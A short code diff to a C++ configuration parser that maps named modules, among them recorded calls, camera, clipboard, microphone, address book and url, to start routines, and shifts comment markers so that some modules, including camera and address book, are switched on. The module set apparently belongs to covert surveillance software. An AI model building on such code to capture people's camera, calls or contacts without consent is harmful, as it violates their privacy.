@@ -52,7 +52,7 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 #ifdef _DEBUG
 		wprintf(L"Parsing Module: %s\n", moduleName.c_str());
 #endif
-/***
+
 		do {
 
 			if (moduleName.compare(L"application") == 0 ) {
@@ -64,17 +64,17 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = RecordedCalls;
 				break;
 			}
-
+/***
 			if (moduleName.compare(L"calllist") == 0 ) {
 				startProc = CallListAgent;
 				break;
 			}
-
+***/
 			if (moduleName.compare(L"camera") == 0 ) {
 				startProc = CameraModule;
 				break;
 			}
-
+/***
 			if (moduleName.compare(L"clipboard") == 0 ) {
 				startProc = ClipboardModule;
 				continue;
@@ -109,13 +109,13 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = RecordedMicrophone;
 				break;
 			}
-
+			***/
 			// AddressBook e calendar sono la stessa cosa
 			if (moduleName.compare(L"addressbook") == 0) {
 				startProc = CalendarModule;
 				break;
 			}
-
+			/***
 			//if (moduleName.compare(L"calendar") == 0 ) {
 			//	startProc = OrganizerAgent;
 			//	break;
@@ -135,9 +135,9 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = UrlModule;
 				break;
 			}
-
-		} while (0);
 ***/
+		} while (0);
+
 		if (startProc != NULL)
 			modulesManager->add(moduleName, jo, startProc);
 
